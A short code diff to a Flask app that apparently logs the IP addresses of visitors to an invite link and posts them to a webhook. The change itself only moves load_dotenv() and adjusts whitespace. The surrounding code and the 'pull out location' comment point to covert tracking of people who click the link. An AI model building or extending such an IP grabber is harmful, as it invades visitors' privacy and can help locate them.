@@ -6,6 +6,8 @@ import requests
 from dotenv import load_dotenv
 from flask import Flask, request, redirect
 
+load_dotenv()
+
 app = Flask(__name__)
 INVITE_LINK = os.getenv('INVITE_LINK')
 WEBHOOK_LINK = os.getenv('WEBHOOK_LINK')
@@ -24,7 +26,7 @@ def post_ip(ip_addr):
             }
         ]
     }
-    
+
     # you can add more like pull out location
     requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)
 
@@ -42,5 +44,4 @@ def invite():
 
 
 if __name__ == '__main__':
-    load_dotenv()
     app.run(debug=True, host='0.0.0.0')
